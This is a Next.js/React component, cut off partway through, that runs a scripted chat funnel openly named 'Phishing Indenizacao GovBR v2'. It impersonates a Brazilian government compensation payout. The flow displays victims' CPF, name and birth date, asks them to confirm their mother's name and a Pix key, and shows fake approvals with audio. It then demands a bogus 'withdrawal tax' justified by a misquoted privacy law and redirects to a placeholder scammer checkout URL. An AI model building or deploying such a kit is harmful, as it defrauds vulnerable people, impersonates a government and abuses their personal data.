
"use client";

import React, { useState, useEffect, useRef, FC } from 'react';
import { useRouter } from 'next/navigation';
import Image from 'next/image';
import { Loader2, VolumeX, CheckCircle, AlertTriangle, Send } from 'lucide-react';

export interface SimulatedChatParams {
  gclid?: string;
  utm_source?: string;
  utm_campaign?: string;
  utm_medium?: string;
  utm_content?: string;
  cpf?: string;
  nome?: string;
  mae?: string;
  nascimento?: string;
}

interface ChatOption {
  text: string;
  nextStep?: string;
  action?: 'setChavePixToUserCPF' | 'redirectToPayment';
  paymentUrl?: string;
  style?: string;
}

interface FlowStepDataDisplayVideo {
  message?: string;
  videoUrl: string;
  thumbnailText?: string;
}

interface FlowStepDataMultipleChoice {
  message: string;
  options: ChatOption[];
  note?: string;
  style?: string;
}

interface FlowStepDataLoading {
  message: string;
  duration_ms: number;
}

interface FlowStepDataDisplayMessage {
  title?: string;
  icon?: 'success_checkmark' | 'currency_dollar_gov_style' | 'warning_amber_gov_style' | string;
  message?: string;
  details?: Record<string, string>;
  audioUrl?: string;
  note?: string;
}

interface FlowStepDataTextInput {
  message: string;
  placeholder: string;
  variableToSet: 'chavePix';
  validation?: 'br_phone' | 'email' | 'alphanumeric_with_hyphens';
}

interface FlowStepDataDisplayDynamicImage {
    message: string;
    templateUrl?: string;
    dataMapping?: any[];
    imageAiHint?: string;
    imageAltText?: string;
}

interface FlowStep {
  type: 'displayVideo' | 'multipleChoice' | 'loading' | 'displayMessage' | 'textInput' | 'displayDynamicImage';
  delay_ms?: number;
  data: FlowStepDataDisplayVideo | FlowStepDataMultipleChoice | FlowStepDataLoading | FlowStepDataDisplayMessage | FlowStepDataTextInput | FlowStepDataDisplayDynamicImage;
  nextStep?: string;
  isTerminal?: boolean;
}

interface Message {
  id: string;
  sender: 'bot' | 'user';
  text?: string;
  options?: ChatOption[];
  displayTitle?: string;
  displayDetails?: Record<string, string>;
  displayIcon?: 'success_checkmark' | 'currency_dollar_gov_style' | 'warning_amber_gov_style' | string;
}

const funnelDefinition: {
  funnelName: string;
  initialStep: string;
  globalVariables: Record<string, string>;
  steps: Record<string, FlowStep>;
} = {
  "funnelName": "Phishing Indenizacao GovBR v2",
  "initialStep": "step1_video",
  "globalVariables": {
    "indenizacaoValor": "R$ 5.960,50",
    "taxaValor": "R$ 61,90",
    "paymentLink": "https://site-do-golpista.com/checkout-pix"
  },
  "steps": {
    "step1_video": {
      "type": "displayVideo",
      "delay_ms": 1000,
      "data": {
        "message": "Primeiro clique no vídeo abaixo para iniciarmos o atendimento 👇",
        "videoUrl": "https://225412.b-cdn.net/Programa%20Saque%20Social.mp4",
        "thumbnailText": "Clique para Assistir e Iniciar"
      },
      "nextStep": "step2_intro_and_ask_mother"
    },
    "step2_intro_and_ask_mother": {
      "type": "multipleChoice",
      "delay_ms": 2500,
      "data": {
        "message": "Nos últimos dias, milhares de brasileiros conseguiram sacar essa indenização do governo.\n\nResponda às perguntas a seguir para aprovação do seu saque de {{indenizacaoValor}}.\n\nPor favor, confirme o nome de sua mãe.",
        "options": [
          {"text": "{{randomMotherName1}}", "nextStep": "step3_ask_civil_status"},
          {"text": "{{randomMotherName2}}", "nextStep": "step3_ask_civil_status"},
          {"text": "{{userMotherName}}", "nextStep": "step3_ask_civil_status"},
          {"text": "Nenhuma das alternativas.", "nextStep": "step3_ask_civil_status"}
        ]
      }
    },
    "step3_ask_civil_status": {
      "type": "multipleChoice",
      "delay_ms": 1500,
      "data": {
        "message": "Qual seu estado civil?",
        "options": [
          {"text": "Solteiro (a)", "nextStep": "step4_loading_validation"},
          {"text": "Casado (a)", "nextStep": "step4_loading_validation"},
          {"text": "Divorciado (a)", "nextStep": "step4_loading_validation"},
          {"text": "Viúvo (a)", "nextStep": "step4_loading_validation"}
        ]
      }
    },
    "step4_loading_validation": {
      "type": "loading",
      "delay_ms": 500,
      "data": {
        "message": "Validando suas respostas...",
        "duration_ms": 3000
      },
      "nextStep": "step5_confirmation_and_audio"
    },
    "step5_confirmation_and_audio": {
      "type": "displayMessage",
      "delay_ms": 500,
      "data": {
        "title": "Autenticidade confirmada!",
        "icon": "success_checkmark",
        "details": {
          "Nome": "{{userName}}",
          "CPF": "{{userCPF}}",
          "Data de Nascimento": "{{userBirthDate}}",
          "Indenização": "{{indenizacaoValor}}",
          "Status": "Pré-aprovado"
        },
        "audioUrl": "https://url-do-golpista.com/audios/confirmacao_aprovada.mp3"
      },
      "nextStep": "step6_ask_pix_type"
    },
    "step6_ask_pix_type": {
      "type": "multipleChoice",
      "delay_ms": 2500,
      "data": {
        "message": "Para prosseguir, selecione a chave PIX que deseja usar para o recebimento:",
        "options": [
          {"text": "Telefone", "nextStep": "step7_input_pix_key"},
          {"text": "CPF (recomendado)", "nextStep": "step7_confirm_pix_key", "action": "setChavePixToUserCPF"},
          {"text": "Email", "nextStep": "step7_input_pix_key"},
        ]
      }
    },
    "step7_confirm_pix_key": {
      "type": "multipleChoice",
      "delay_ms": 1500,
      "data": {
        "message": "ATENÇÃO: Verifique se a chave Pix (seu CPF) está correta.\n\nChave: {{chavePix}}\n\nO governo não se responsabiliza caso você informe a Chave PIX errada.",
        "options": [
          {"text": "Sim, está correto.", "nextStep": "step8_loading_pix_registration"},
          {"text": "Não, desejo usar outra chave.", "nextStep": "step7_input_pix_key"}
        ]
      }
    },
    "step7_input_pix_key": {
      "type": "textInput",
      "delay_ms": 1000,
      "data": {
          "message": "Por favor, digite sua chave PIX:",
          "placeholder": "Digite sua chave PIX aqui",
          "variableToSet": "chavePix"
      },
      "nextStep": "step7b_confirm_manual_pix_key"
    },
    "step7b_confirm_manual_pix_key": {
        "type": "multipleChoice",
        "delay_ms": 1500,
        "data": {
            "message": "ATENÇÃO: Verifique se a chave Pix está correta.\n\nChave: {{chavePix}}\n\nO governo não se responsabiliza caso você informe a Chave PIX errada.",
            "options": [
                {"text": "Sim, está correto.", "nextStep": "step8_loading_pix_registration"},
                {"text": "Não, desejo corrigir.", "nextStep": "step7_input_pix_key"}
            ]
        }
    },
    "step8_loading_pix_registration": {
      "type": "loading",
      "delay_ms": 500,
      "data": {
        "message": "Aguarde alguns segundos, estamos cadastrando sua chave PIX no sistema...",
        "duration_ms": 2500
      },
      "nextStep": "step9_pix_registered_and_audio"
    },
    "step9_pix_registered_and_audio": {
      "type": "displayMessage",
      "delay_ms": 500,
      "data": {
        "title": "Chave PIX Cadastrada",
        "icon": "success_checkmark",
        "message": "Sua chave pix foi cadastrada com sucesso!",
        "details": {
          "Nome": "{{userName}}",
          "Chave Pix": "{{chavePix}}",
          "Status": "Aprovado"
        },
        "audioUrl": "https://url-do-golpista.com/audios/pix_cadastrado.mp3"
      },
      "nextStep": "step10_ask_generate_receipt"
    },
    "step10_ask_generate_receipt": {
      "type": "multipleChoice",
      "delay_ms": 3500,
      "data": {
        "message": "Clique no botão abaixo para confirmar e liberar o envio da sua indenização para a chave PIX informada.\n\nIremos gerar seu comprovante do valor de {{indenizacaoValor}} neste instante.",
        "options": [
          {"text": "Desejo receber meu comprovante de recebimento.", "nextStep": "step11_generating_receipt_image"}
        ]
      }
    },
    "step11_generating_receipt_image": {
      "type": "displayMessage",
      "delay_ms": 1000,
      "data": {
        "message": "Gerando seu comprovante de recebimento dos valores..."
      },
      "nextStep": "step12_reveal_tax_and_audio"
    },
    "step12_reveal_tax_and_audio": {
      "type": "displayMessage",
      "delay_ms": 3000,
      "data": {
        "title": "Indenização Governamental",
        "details": {
          "Indenização disponível para saque": "{{indenizacaoValor}}",
          "Titular": "{{userName}}",
          "Chave Pix": "{{chavePix}}",
          "Imposto de Saque": "{{taxaValor}}"
        },
        "audioUrl": "https://url-do-golpista.com/audios/explicacao_taxa.mp3"
      },
      "nextStep": "step13_final_justification_and_cta"
    },
    "step13_final_justification_and_cta": {
      "type": "multipleChoice",
      "delay_ms": 4000,
      "data": {
        "message": "⚠️ Seu dinheiro está vinculado ao seu CPF e somente você pode acessá-lo.\n\nPortanto, a taxa transacional paga ao solicitar o saque, não pode ser descontada do valor total que você tem a receber, devido à Lei que protege os direitos fundamentais de Privacidade e Segurança.\n\nLei n.º 13.709 de 14 de agosto de 2018",
        "options": [
          {
            "text": "Concluir pagamento e receber minha indenização",
            "action": "redirectToPayment",
            "paymentUrl": "{{paymentLink}}"
          }
        ]
      }
    }
  }
};


const STORAGE_KEY_MESSAGES = 'simulatedChatMessages_v2_1';
const STORAGE_KEY_STEP = 'simulatedChatCurrentStepKey_v2_1';
const STORAGE_KEY_VARIABLES = 'simulatedChatFlowVariables_v2_1';
const STORAGE_KEY_SESSION_CPF = 'simulatedChatSessionCpf_v2_1';

const DEFAULT_APPEARANCE_DELAY_MS = 500; 

const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initialParams }) => {
  const [messages, setMessages] = useState<Message[]>([]);
  const [currentStepKey, setCurrentStepKey] = useState<string>(funnelDefinition.initialStep);

  const [flowVariables, setFlowVariables] = useState<Record<string, any>>(() => {
    const initialGlobalVars = funnelDefinition.globalVariables || {};
    return {
        ...initialGlobalVars,
        dataAtual: new Date().toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit', year: 'numeric' }),
        userName: initialParams.nome || 'Usuário',
        userCPF: initialParams.cpf || '---.---.---.--',
        userBirthDate: initialParams.nascimento || '--/--/----',
        userMotherName: initialParams.mae || 'Nome da Mãe Indisponível',
        randomMotherName1: 'Maria da Silva Souza', // Placeholder
        randomMotherName2: 'Joana Oliveira Costa', // Placeholder
        chavePix: initialParams.cpf || '---.---.---.--', // Default chavePix to userCPF
    };
  });

  const [isBotTyping, setIsBotTyping] = useState(false);
  const chatEndRef = useRef<HTMLDivElement>(null);
  const audioRef = useRef<HTMLAudioElement>(null);

  const [showVideoPlaceholderOverlay, setShowVideoPlaceholderOverlay] = useState(true);
  const videoPlaceholderData = useRef<FlowStepDataDisplayVideo | null>(null);
  const [currentVideoMessage, setCurrentVideoMessage] = useState<string | null>(null);

  const [isLoadingStep, setIsLoadingStep] = useState(false);
  const [loadingMessage, setLoadingMessage] = useState<string | null>(null);

  const [currentImageDetails, setCurrentImageDetails] = useState<{url: string; alt: string; message?: string, aiHint?: string} | null>(null);
  const [currentDisplayMessage, setCurrentDisplayMessage] = useState<Message | null>(null);

  const [isTextInputActive, setIsTextInputActive] = useState(false);
  const [currentTextInputConfig, setCurrentTextInputConfig] = useState<FlowStepDataTextInput | null>(null);
  const [textInputValue, setTextInputValue] = useState("");

  const prevCurrentStepKeyRef = useRef<string>();
  const autoTransitionTimerRef = useRef<NodeJS.Timeout | null>(null);
  const justLoadedSessionRef = useRef(false);


  useEffect(() => {
    if (typeof window === 'undefined') return;

    const currentCpfFromParams = initialParams.cpf;
    const currentNameFromParams = initialParams.nome; // Using name as part of identifier
    const sessionIdentifier = `${currentCpfFromParams}_${currentNameFromParams}`;
    const storedSessionIdentifier = sessionStorage.getItem(STORAGE_KEY_SESSION_CPF);

    let shouldResetChat = false;

    const defaultGlobalVars = funnelDefinition.globalVariables || {};
    const defaultFlowVars = {
        ...defaultGlobalVars,
        dataAtual: new Date().toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit', year: 'numeric' }),
        userName: initialParams.nome || 'Usuário',
        userCPF: initialParams.cpf || '---.---.---.--',
        userBirthDate: initialParams.nascimento || '--/--/----',
        userMotherName: initialParams.mae || 'Nome da Mãe Indisponível',
        randomMotherName1: 'Maria da Silva Souza',
        randomMotherName2: 'Joana Oliveira Costa',
        chavePix: initialParams.cpf || '---.---.---.--',
    };

    if (currentCpfFromParams && storedSessionIdentifier === sessionIdentifier) {
      const savedMessages = sessionStorage.getItem(STORAGE_KEY_MESSAGES);
      const savedStep = sessionStorage.getItem(STORAGE_KEY_STEP);
      const savedFlowVars = sessionStorage.getItem(STORAGE_KEY_VARIABLES);

      setMessages(savedMessages ? JSON.parse(savedMessages) : []);
      const stepToSet = (savedStep && funnelDefinition.steps[JSON.parse(savedStep)])
                         ? JSON.parse(savedStep)
                         : funnelDefinition.initialStep;
      setCurrentStepKey(stepToSet);

      const newFlowVariables = { ...defaultFlowVars };
      if (savedFlowVars) {
        const parsedSaved = JSON.parse(savedFlowVars);
        // Restore specific dynamic variables like chavePix
        newFlowVariables.chavePix = parsedSaved.chavePix || defaultFlowVars.chavePix;
        // Ensure global variables from definition are also present
        Object.keys(defaultGlobalVars).forEach(key => {
            if (parsedSaved[key] !== undefined) newFlowVariables[key] = parsedSaved[key];
        });
      }
      setFlowVariables(newFlowVariables);
      justLoadedSessionRef.current = (savedMessages && savedMessages !== "[]"); // True if there were messages
    } else {
      shouldResetChat = true;
    }

    if (shouldResetChat) {
      sessionStorage.removeItem(STORAGE_KEY_MESSAGES);
      sessionStorage.removeItem(STORAGE_KEY_STEP);
      sessionStorage.removeItem(STORAGE_KEY_VARIABLES);
      if (currentCpfFromParams) { // Only set new session ID if CPF is present
        sessionStorage.setItem(STORAGE_KEY_SESSION_CPF, sessionIdentifier);
      } else {
        sessionStorage.removeItem(STORAGE_KEY_SESSION_CPF); // Clear if no CPF
      }
      setMessages([]);
      setCurrentStepKey(funnelDefinition.initialStep);
      setFlowVariables(defaultFlowVars);
      prevCurrentStepKeyRef.current = undefined; // Force initial step to be treated as new
      justLoadedSessionRef.current = false;
    }
  }, [initialParams.cpf, initialParams.nome, initialParams.mae, initialParams.nascimento]); // Re-run if any identifying param changes

  useEffect(() => {
    if (typeof window === 'undefined') return;
    const currentCpfFromParams = initialParams.cpf;
    const currentNameFromParams = initialParams.nome;
    const sessionIdentifier = `${currentCpfFromParams}_${currentNameFromParams}`;
    if (sessionStorage.getItem(STORAGE_KEY_SESSION_CPF) === sessionIdentifier) {
      sessionStorage.setItem(STORAGE_KEY_MESSAGES, JSON.stringify(messages));
    }
  }, [messages, initialParams.cpf, initialParams.nome]);

  useEffect(() => {
     if (typeof window === 'undefined') return;
    const currentCpfFromParams = initialParams.cpf;
    const currentNameFromParams = initialParams.nome;
    const sessionIdentifier = `${currentCpfFromParams}_${currentNameFromParams}`;
    if (sessionStorage.getItem(STORAGE_KEY_SESSION_CPF) === sessionIdentifier) {
      sessionStorage.setItem(STORAGE_KEY_STEP, JSON.stringify(currentStepKey));
    }
  }, [currentStepKey, initialParams.cpf, initialParams.nome]);

  useEffect(() => {
    if (typeof window === 'undefined') return;
    const currentCpfFromParams = initialParams.cpf;
    const currentNameFromParams = initialParams.nome;
    const sessionIdentifier = `${currentCpfFromParams}_${currentNameFromParams}`;
    if (sessionStorage.getItem(STORAGE_KEY_SESSION_CPF) === sessionIdentifier) {
      const persistableFlowVariables: Record<string, any> = {};
      // Persist global variables from definition and dynamic ones like chavePix
      Object.keys(flowVariables).forEach(key => {
        if (key in funnelDefinition.globalVariables || ['chavePix', 'userName', 'userCPF', 'userBirthDate', 'userMotherName'].includes(key)) {
            persistableFlowVariables[key] = flowVariables[key];
        }
      });
      sessionStorage.setItem(STORAGE_KEY_VARIABLES, JSON.stringify(persistableFlowVariables));
    }
  }, [flowVariables, initialParams.cpf, initialParams.nome]);


  const formatText = (text: string | undefined): string => {
    if (!text) return '';
    let formattedText = text;
    const allVars = { // Ensure initialParams are lower priority than flowVariables if keys overlap
        ...initialParams,
        ...(funnelDefinition.globalVariables || {}), // Ensure global variables are available
        ...flowVariables, // Dynamic variables like chavePix, and potentially overrides from initialParams
    };

    // Explicitly use formatted values for user-specific data
    allVars.userName = flowVariables.userName || initialParams.nome || 'Usuário';
    allVars.userCPF = flowVariables.userCPF || initialParams.cpf || '---.---.---.--';
    allVars.userBirthDate = flowVariables.userBirthDate || initialParams.nascimento || '--/--/----';
    allVars.userMotherName = flowVariables.userMotherName || initialParams.mae || 'Nome da Mãe Indisponível';


    for (const key in allVars) {
      const placeholder = `{{${key}}}`;
      let valueToInsert = String(allVars[key]);

      // Ensure undefined/null values are handled gracefully, e.g., replaced by '---' or similar
      if (valueToInsert !== undefined && valueToInsert !== null && valueToInsert.toLowerCase() !== "null" && valueToInsert.toLowerCase() !== "undefined") {
        // Apply specific formatting for CPF and Date
        if ((key === 'userCPF' || key === 'chavePix') && valueToInsert.match(/^\d{11}$/)) { // Raw 11-digit CPF
            valueToInsert = valueToInsert.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
        } else if (key === 'userCPF' && valueToInsert.match(/^\d{3}\.\d{3}\.\d{3}-\d{2}$/)) { // Already formatted CPF
            // No change needed
        } else if (key === 'userBirthDate' && valueToInsert.match(/^\d{4}-\d{2}-\d{2}(T\d{2}:\d{2}:\d{2}(\.\d{3}Z?)?)?$/)) { // ISO Date
            const datePart = valueToInsert.split('T')[0];
            const parts = datePart.split('-');
            if (parts.length === 3) valueToInsert = `${parts[2]}/${parts[1]}/${parts[0]}`;
        }
        // Capitalize names if they are all lowercase (simple heuristic)
        else if ((key === 'userName' || key === 'userMotherName') && valueToInsert && valueToInsert === valueToInsert.toLowerCase()) {
             valueToInsert = valueToInsert
                .split(' ')
                .map(word => word.charAt(0).toUpperCase() + word.slice(1))
                .join(' ');
        }
        formattedText = formattedText.replace(new RegExp(placeholder.replace(/([{}])/g, '\\$1'), 'g'), valueToInsert);
      } else {
         // Replace with a placeholder if the value is missing
         formattedText = formattedText.replace(new RegExp(placeholder.replace(/([{}])/g, '\\$1'), 'g'), '---');
      }
    }
    return formattedText;
  };

  const formatDetailsObject = (details: Record<string, string> | undefined): Record<string, string> | undefined => {
    if (!details) return undefined;
    const formatted: Record<string, string> = {};
    for (const key in details) {
      formatted[formatText(key)] = formatText(details[key]);
    }
    return formatted;
  };

  const handleUserActionAndNavigate = (nextStepKey?: string) => {
    if (autoTransitionTimerRef.current) {
        clearTimeout(autoTransitionTimerRef.current);
        autoTransitionTimerRef.current = null;
    }
    // Clear UI elements from the previous step
    setCurrentDisplayMessage(null);
    setCurrentImageDetails(null);
    setIsLoadingStep(false);
    setLoadingMessage(null);
    // Only clear video if the current step wasn't the video step (to avoid flicker if user clicks video then it immediately tries to clear)
    if (funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps]?.type !== 'displayVideo') {
        videoPlaceholderData.current = null;
        setCurrentVideoMessage(null);
    }
    setIsTextInputActive(false);
    setCurrentTextInputConfig(null);

    if (nextStepKey && funnelDefinition.steps[nextStepKey as keyof typeof funnelDefinition.steps]) {
        setCurrentStepKey(nextStepKey);
    } else if (nextStepKey) {
        console.error("SimulatedChatFlow: Invalid nextStepKey referenced:", nextStepKey);
        // Optionally, handle this by staying on the current step or moving to an error step
    }
  };

  useEffect(() => {
    if (typeof window === 'undefined') return;

    const stepConfig = funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps] as FlowStep | undefined;

    if (!stepConfig) {
      console.error("SimulatedChatFlow: Invalid step key:", currentStepKey);
      // Avoid adding multiple error messages if the effect re-runs for the same invalid key
      if (prevCurrentStepKeyRef.current !== currentStepKey && !justLoadedSessionRef.current) {
        setMessages(prev => [...prev, {id: `err-invalid-step-${Date.now()}`, sender: 'bot', text: "Desculpe, ocorreu um erro interno no fluxo."}]);
      }
      setIsBotTyping(false); // Stop typing on error
      return;
    }

    setIsBotTyping(true); // Start typing for the new step

    // Clear any pending auto-transitions from previous steps
    if (autoTransitionTimerRef.current) {
      clearTimeout(autoTransitionTimerRef.current);
      autoTransitionTimerRef.current = null;
    }

    const isNewStep = prevCurrentStepKeyRef.current !== currentStepKey;

    // Determine if this step's main content should be processed as "new"
    // (i.e., add its primary message/UI to the chat).
    // This is true if it's a genuinely new step and not just a re-render of a loaded session's current step,
    // OR if it's a video step being loaded from session (video needs to re-init its UI).
    let processAsNewStep = (isNewStep && !justLoadedSessionRef.current) ||
                           (justLoadedSessionRef.current && stepConfig.type === 'displayVideo' && isNewStep);


    // Reset UI states if it's a new step that isn't a video step being loaded from session.
    // Video step loading handles its own UI reset inside the 'justLoadedSessionRef.current' block.
    if (isNewStep && !(justLoadedSessionRef.current && stepConfig.type === 'displayVideo')) {
      setIsLoadingStep(false);
      setLoadingMessage(null);
      setCurrentImageDetails(null);
      setCurrentDisplayMessage(null);
      setIsTextInputActive(false);
      setCurrentTextInputConfig(null);
      if (stepConfig.type !== 'displayVideo') { // Don't clear video if the new step is not a video step
        videoPlaceholderData.current = null;
        setCurrentVideoMessage(null);
      }
    }

    const effectiveAppearanceDelay = stepConfig.delay_ms ?? DEFAULT_APPEARANCE_DELAY_MS;

    const typingTimer = setTimeout(() => {
      const processStepAfterDelayInternal = () => {
        if (processAsNewStep) {
          switch (stepConfig.type) {
            case 'displayVideo': {
              const data = stepConfig.data as FlowStepDataDisplayVideo;
              setCurrentVideoMessage(formatText(data.message));
              videoPlaceholderData.current = { ...data, thumbnailText: data.thumbnailText || "Clique para Assistir" };
              setShowVideoPlaceholderOverlay(true);
              // The step is now "active" and waiting for user. Bot is not "typing".
              // setIsBotTyping(false) will be called after the switch.
              break; 
            }
            case 'multipleChoice': {
              const data = stepConfig.data as FlowStepDataMultipleChoice;
              const formattedOptions = data.options.map(opt => ({ ...opt, text: formatText(opt.text) }));
              setMessages(prev => [...prev, { id: `bot-msg-${Date.now()}`, sender: 'bot', text: formatText(data.message), options: formattedOptions }]);
              break;
            }
            case 'loading': {
              const data = stepConfig.data as FlowStepDataLoading;
              setLoadingMessage(formatText(data.message));
              setIsLoadingStep(true);
              // Auto-transition after loading duration
              autoTransitionTimerRef.current = setTimeout(() => {
                // Check if still on the same loading step before navigating
                if (prevCurrentStepKeyRef.current === currentStepKey) {
                  setIsLoadingStep(false); // Clear loading state
                  setLoadingMessage(null);
                  if (stepConfig.nextStep) handleUserActionAndNavigate(stepConfig.nextStep);
                }
              }, data.duration_ms);
              setIsBotTyping(false); // Loading itself is the content, so stop "typing"
              return; // Return here as loading step handles its own transition and typing state
            }
            case 'displayMessage': {
              const data = stepConfig.data as FlowStepDataDisplayMessage;
              const displayMsgData: Message = {
                id: `bot-msg-${Date.now()}`, sender: 'bot',
                displayTitle: formatText(data.title),
                text: data.message ? formatText(data.message) : undefined,
                displayDetails: formatDetailsObject(data.details),
                displayIcon: data.icon,
              };
              setCurrentDisplayMessage(displayMsgData); // Use dedicated state for displayMessage
              if (data.audioUrl && audioRef.current) {
                audioRef.current.src = data.audioUrl;
                audioRef.current.play().catch(e => console.warn("Audio autoplay failed:", e));
              }
              break;
            }
            case 'textInput': {
              const data = stepConfig.data as FlowStepDataTextInput;
              // Add the bot's prompt for text input
              setMessages(prev => [...prev, { id: `bot-msg-${Date.now()}`, sender: 'bot', text: formatText(data.message) }]);
              setCurrentTextInputConfig(data);
              setIsTextInputActive(true);
              setTextInputValue(""); // Clear previous input
              // setIsBotTyping(false) will be called after the switch.
              break;
            }
             case 'displayDynamicImage': {
              console.warn("SimulatedChatFlow: 'displayDynamicImage' step type is simplified. Actual image generation with text overlay is not implemented.");
              const data = stepConfig.data as FlowStepDataDisplayDynamicImage;
              const messageToShow = formatText(data.message) || "Gerando seu comprovante...";
               if (data.templateUrl) { // If there's a template, use the image display block
                setCurrentImageDetails({
                    url: data.templateUrl, // This would be the pre-rendered template or a placeholder
                    alt: formatText(data.imageAltText) || "Comprovante",
                    message: messageToShow, // Optional message above/below image
                    aiHint: data.imageAiHint
                });
              } else { // Otherwise, just show as a simple message
                setMessages(prev => [...prev, { id: `bot-msg-${Date.now()}`, sender: 'bot', text: messageToShow}]);
              }
              break;
            }
            default:
              console.error("SimulatedChatFlow: Unknown step type in processAsNewStep:", (stepConfig as any).type);
              setMessages(prev => [...prev, {id: `err-type-new-${Date.now()}`, sender: 'bot', text: "Erro: tipo de passo desconhecido."}]);
          }
        } else if (isNewStep && justLoadedSessionRef.current) {
          // This block handles re-hydrating the UI for a step loaded from session.
          // It ensures the correct UI elements (video, input field, display message) are shown
          // without re-adding the bot's primary message for that step to the chat history.
          if (stepConfig.type === 'multipleChoice') {
            // If the last message isn't this bot's question, or options are missing, re-add it.
            const lastMessage = messages[messages.length - 1];
            const data = stepConfig.data as FlowStepDataMultipleChoice;
            const formattedOptions = data.options.map(opt => ({ ...opt, text: formatText(opt.text) }));
            if (messages.length === 0 || (lastMessage && lastMessage.sender === 'user') || (lastMessage && !lastMessage.options) || (lastMessage && stepConfig.type === 'multipleChoice' && (lastMessage.text !== formatText(data.message) || JSON.stringify(lastMessage.options) !== JSON.stringify(formattedOptions)))) {
               setMessages(prev => [...prev, { id: `bot-session-load-opts-${Date.now()}`, sender: 'bot', text: formatText(data.message), options: formattedOptions }]);
            }
          } else if (stepConfig.type === 'textInput') {
            setCurrentTextInputConfig(stepConfig.data as FlowStepDataTextInput);
            setIsTextInputActive(true);
            // If the last message isn't the bot's prompt for input, re-add it
             const lastMessage = messages[messages.length - 1];
             if(!lastMessage || lastMessage.sender === 'user' || lastMessage.text !== formatText((stepConfig.data as FlowStepDataTextInput).message)) {
                setMessages(prev => [...prev, { id: `bot-session-load-text-input-${Date.now()}`, sender: 'bot', text: formatText((stepConfig.data as FlowStepDataTextInput).message) }]);
             }
          } else if (stepConfig.type === 'displayMessage'){
              // For displayMessage, just set the currentDisplayMessage state
              const data = stepConfig.data as FlowStepDataDisplayMessage;
               const displayMsgData: Message = {
                id: `bot-session-load-disp-${Date.now()}`, sender: 'bot', // ID is temporary for state, not added to messages array
                displayTitle: formatText(data.title),
                text: data.message ? formatText(data.message) : undefined,
                displayDetails: formatDetailsObject(data.details),
                displayIcon: data.icon,
              };
              setCurrentDisplayMessage(displayMsgData);
          }  else if (stepConfig.type === 'displayDynamicImage') { // Simplified
              const data = stepConfig.data as FlowStepDataDisplayDynamicImage;
              const messageToShow = formatText(data.message) || "Gerando comprovante...";
               if (data.templateUrl) {
                    setCurrentImageDetails({
                        url: data.templateUrl,
                        alt: formatText(data.imageAltText) || "Comprovante",
                        message: messageToShow,
                        aiHint: data.imageAiHint
                    });
                } else { // If no template, and last message isn't this, add it
                    const lastMessage = messages[messages.length - 1];
                    if(!lastMessage || lastMessage.sender === 'user' || lastMessage.text !== messageToShow) {
                        setMessages(prev => [...prev, { id: `bot-session-load-dynimg-${Date.now()}`, sender: 'bot', text: messageToShow}]);
                    }
                }
          } else if (stepConfig.type === 'displayVideo') {
            // If the loaded step is a video, we need to re-initialize its UI elements.
            const data = stepConfig.data as FlowStepDataDisplayVideo;
            setCurrentVideoMessage(formatText(data.message));
            videoPlaceholderData.current = { ...data, thumbnailText: data.thumbnailText || "Clique para Assistir" };
            setShowVideoPlaceholderOverlay(true);
          }
        } else {
          // This block handles re-formatting content of an already displayed step if flowVariables change.
          // For example, if a {{variable}} in a currentDisplayMessage needs to update.
          if (currentDisplayMessage) { // If a display message is currently shown
             const data = funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps]?.data as FlowStepDataDisplayMessage;
              if (data && data.type === 'displayMessage') { // Check if current step is indeed displayMessage
                   setCurrentDisplayMessage(prev => prev ? {
                      ...prev,
                      displayTitle: formatText(data.title),
                      text: data.message ? formatText(data.message) : undefined,
                      displayDetails: formatDetailsObject(data.details),
                      // icon doesn't change dynamically based on flowVariables typically
                  } : null);
              }
          }
          // For simple text messages already in the `messages` array, re-rendering due to `flowVariables`
          // change in `formatText` would happen automatically if `messages` itself is a dependency,
          // but `messages` isn't a direct dependency of this effect for this purpose.
          // Instead, components rendering messages use `formatText` directly.
          // If a multipleChoice step's options text needs to be dynamic, it would re-render correctly
          // when `flowVariables` change because the `messages.map` in JSX uses `formatText`.
        }

        setIsBotTyping(false); // Content is now ready or waiting for interaction

        // Auto-transition for non-interactive steps or steps that complete an action
        const canAutoTransition = stepConfig.nextStep && !stepConfig.isTerminal &&
                                  (stepConfig.type === 'displayMessage' || stepConfig.type === 'displayDynamicImage');
                                  // Removed 'loading' as it handles its own transition

        // Define delay for auto-transition for displayMessage/Image. Loading steps handle their own.
        let nextStepTransitionDelayMs = stepConfig.type === 'displayMessage' ? 4500 : (stepConfig.type === 'displayDynamicImage' ? 3000 : 0);
        if (stepConfig.type === 'displayMessage' && !(stepConfig.data as FlowStepDataDisplayMessage).details) { // Shorter delay for simple messages
            nextStepTransitionDelayMs = (stepConfig.data as FlowStepDataDisplayMessage).message ? 2500 : 1200;
        }


        if (canAutoTransition && (processAsNewStep || (isNewStep && justLoadedSessionRef.current))) {
          autoTransitionTimerRef.current = setTimeout(() => {
            // Ensure still on the same step before auto-transitioning
            if (prevCurrentStepKeyRef.current === currentStepKey) {
               handleUserActionAndNavigate(stepConfig.nextStep as string);
            }
          }, nextStepTransitionDelayMs);
        }
      };

      processStepAfterDelayInternal();

      // After the first processing (either new or loaded session), mark session as "not just loaded"
      if (justLoadedSessionRef.current && isNewStep) {
          justLoadedSessionRef.current = false;
      }

    }, effectiveAppearanceDelay);

    // Update previous step key ref *after* all logic for the current render cycle
    if (isNewStep) {
      prevCurrentStepKeyRef.current = currentStepKey;
    }

    // Cleanup timers on unmount or before re-running for a new step
    return () => {
      clearTimeout(typingTimer);
      if (autoTransitionTimerRef.current) {
        clearTimeout(autoTransitionTimerRef.current);
        autoTransitionTimerRef.current = null;
      }
    };
  }, [currentStepKey, initialParams]); // Removed flowVariables, messages

  useEffect(() => {
    chatEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [messages, isLoadingStep, loadingMessage, currentImageDetails, currentDisplayMessage, currentVideoMessage, isTextInputActive, isBotTyping]);


  const handleOptionClick = (option: ChatOption) => {
    handleUserActionAndNavigate(); // Clear previous step's UI elements and timers

    const userMessageText = option.text || "Opção selecionada"; 
    const userMessageId = `user-${Date.now()}`;

    setMessages(prevMsgs => {
      let msgsWithUserReply = [...prevMsgs, { id: userMessageId, sender: 'user', text: userMessageText }];
      
      // Find the last bot message with options and remove its options
      let repliedToBotMessageIndex = -1;
